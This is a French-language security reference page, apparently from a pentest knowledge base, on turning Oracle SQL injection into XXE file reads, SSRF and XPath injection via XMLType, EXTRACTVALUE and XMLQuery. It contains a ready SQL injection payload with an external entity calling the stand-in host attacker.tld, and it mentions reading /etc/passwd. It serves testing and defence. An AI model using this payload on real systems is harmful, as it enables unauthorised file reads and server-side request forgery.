---
order: 13
title: "Abus de XML et XXE dans l'injection Oracle"
description: "Abuser du parsing XMLType d'Oracle depuis une injection pour atteindre la lecture de fichiers par entité externe XML et le SSRF, et injecter dans XMLQuery et EXTRACTVALUE."
keywords:
  - XMLType
  - XXE
  - EXTRACTVALUE
  - XMLQuery
  - SSRF Oracle
---

# Abus de XML et XXE

Les fonctionnalités XML d'Oracle transforment une injection SQL en attaque du parseur XML. Construire un `XMLType` à partir d'un balisage contrôlé par l'attaquant fait parser celui-ci par la base de données, et historiquement ce parseur résolvait les entités externes, donnant la lecture de fichiers et la falsification de requête côté serveur depuis l'intérieur du SQL.

Un document à entité externe construit via `XMLType` résout l'entité lors du parsing, de sorte qu'une entité `SYSTEM` pointant vers un fichier ou une URL est récupérée par le serveur de base de données :

```sql
' AND XMLType('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://attacker.tld/">]><r>&x;</r>') IS NOT NULL-- 
```

Pointer l'entité vers `file:///etc/passwd` lit un fichier, et vers une URL interne réalise un SSRF, la réponse apparaissant via une erreur ou un `EXTRACTVALUE` supplémentaire. Cela fait aussi office de canal hors bande, puisque la récupération `http://` atteint un listener de l'attaquant même quand le contenu n'est pas reflété. Les versions actuelles corrigées restreignent la résolution des entités externes, cela dépend donc de la version et de la configuration de la base de données.

Séparément, les fonctions de requête XML sont des points d'injection lorsque l'entrée est concaténée dans leur argument XPath ou XQuery. `EXTRACTVALUE(xml, xpath)`, `XMLQuery` et `XMLTABLE` évaluent une expression construite à partir de l'entrée, de sorte qu'un attaquant qui contrôle une partie du XPath peut rediriger la sélection ou déclencher des erreurs qui fuitent des données, la même classe de faille que l'injection XPath appliquée à l'intérieur de la base de données.

## Outils

- **sqlmap** : détecte l'injection dans les fonctions XML telles que `EXTRACTVALUE`.
- **Burp Collaborator** : capture les rappels DNS et HTTP de l'entité externe.
- Test manuel avec Burp Repeater et le client Oracle (sqlplus ou SQLcl).

## Références

- Oracle Database XML DB Developer's Guide: XMLType, XMLQuery, external entities
- OWASP Testing Guide: Testing for SQL Injection; XML External Entity Prevention
